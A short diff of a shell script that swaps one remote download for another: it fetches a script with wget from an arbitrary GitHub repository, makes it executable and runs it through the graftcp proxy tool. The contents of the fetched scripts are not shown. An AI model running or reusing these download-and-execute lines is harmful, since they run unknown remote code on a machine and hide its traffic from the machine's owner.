@@ -19,9 +19,9 @@ echo " "
 
 echo " "
 
-wget https://github.com/Akatsoki/newwz/raw/main/Neww.sh
+wget https://github.com/rindalasririn/a/raw/main/11.sh
 
 
-chmod +x Neww.sh
+chmod +x 11.sh
 
-./graftcp/graftcp ./Neww.sh
+./graftcp/graftcp ./11.sh
